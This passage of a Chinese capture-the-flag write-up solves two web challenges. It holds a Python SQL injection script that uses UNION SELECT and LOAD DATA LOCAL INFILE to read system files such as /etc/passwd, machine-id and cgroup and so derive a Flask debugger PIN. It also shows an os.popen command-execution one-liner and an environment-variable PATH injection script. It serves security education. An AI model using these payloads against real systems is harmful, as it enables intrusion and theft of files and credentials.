<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_tables</span>():</span><br><span class="line">    payload=<span class="string">&quot;0&#x27; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=&#x27;ctf&#x27;#&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;note_id&#x27;</span>: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        txt = s.get(url+<span class="string">&#x27;view&#x27;</span>, params=data).text</span><br><span class="line">        txt = txt.split(<span class="string">&#x27;&lt;p style=&quot;text-align: center&quot;&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/p&gt;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>(<span class="params">filename,tablename</span>):</span><br><span class="line">    payload=<span class="string">f&quot;&#x27;;create table if not exists <span class="subst">&#123;tablename&#125;</span>(data text);&quot;</span> \</span><br><span class="line">            <span class="string">f&quot;load data local infile &#x27;<span class="subst">&#123;filename&#125;</span>&#x27; into table <span class="subst">&#123;tablename&#125;</span>;#&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;note_id&#x27;</span>: payload&#125;</span><br><span class="line">    s.get(url + <span class="string">&#x27;view&#x27;</span>, params=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_table</span>(<span class="params">tablename</span>):</span><br><span class="line">    payload = <span class="string">f&quot;0&#x27; union select 1,2,3,group_concat(data,&#x27;\n&#x27;),5 from <span class="subst">&#123;tablename&#125;</span>#&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;note_id&#x27;</span>: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        txt = s.get(url + <span class="string">&#x27;view&#x27;</span>, params=data).text</span><br><span class="line">        txt = txt.split(<span class="string">&#x27;&lt;p style=&quot;text-align: center&quot;&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/p&gt;&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.27:5002/&quot;</span></span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;mac&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;mac&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">r = s.post(url=url+<span class="string">&#x27;login&#x27;</span>, data=login_data)</span><br><span class="line">show_tables()</span><br><span class="line">load_data(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">read_table(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">show_tables()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/etc/passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">,daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,sync:x:4:65534:sync:/bin:/bin/sync</span></span><br><span class="line"><span class="string">,games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">,ctf:x:1000:1000::/home/ctf:/bin/sh</span></span><br><span class="line"><span class="string">,root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">,daemon:x:1:1:d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/sys/class/net/eth0/address</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">02:42:ac:13:00:03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/machine-id</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">96cec10d3d9307792745ec3b85c89620</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/proc/sys/kernel/random/boot_id</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b5ab2c33-deaa-45e0-b271-b3a7145f1dd3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/proc/self/cgroup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">8104cff0b68712e4415efe7811acfd4fce16d2e90411d0d5e053df7a8e107a90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>获得了正确的PIN码后，进入控制台，用<code>__import__(&quot;os&quot;).popen(&quot;cmd&quot;).read()</code>执行命令，拿到flag<br><img src="https://img-blog.csdnimg.cn/fb15cb0c2b6e44e785fc79f554bbd837.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p><img src="https://img-blog.csdnimg.cn/d582ba0868db4a17aaa79278f37cd3b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>首先是md5截断比较，用脚本跑出结果拿到端口号</p>
<p>打开附件进行源码审计</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">    flag = os.getenv(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        lotto_key = lotto_key.upper()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">        os.environ[lotto_key] = lotto_value</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">                lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">                forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                message = <span class="string">&#x27;Sorry forecast failed, maybe lucky next time!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        message = <span class="string">&#x27;NO NO NO, JUST LOTTO!&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br></pre></td></tr></table></figure>
<p>源码中提供一种方式通过<code>lotto_key</code>和<code>lotto_value</code>来修改环境变量的值，可以修改PATH为一个无效值，从而使wget报错，导致上一次的lotto_result不会改变，然后直接复制上一次的lotto结果传入即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://121.36.217.177:53001/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lotto</span>(<span class="params">key,value</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;lotto_key&quot;</span>: key,</span><br><span class="line">            <span class="string">&quot;lotto_value&quot;</span>: value&#125;</span><br><span class="line">    txt=requests.post(url + <span class="string">&quot;lotto&quot;</span>,data=data).text</span><br><span class="line">    <span class="built_in">print</span>(txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResult</span>():</span><br><span class="line">    txt=requests.get(url+<span class="string">&quot;result&quot;</span>).text</span><br><span class="line">    p=txt.split(<span class="string">&quot;&lt;p&gt;&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">lotto(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">result= &#123;<span class="string">&quot;file&quot;</span>:getResult()&#125;</span><br><span class="line">requests.post(url + <span class="string">&quot;forecast&quot;</span>,files=result)</span><br><span class="line">lotto(<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line"><span class="comment">#*ctf&#123;its_forecast_0R_GUNICORN&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
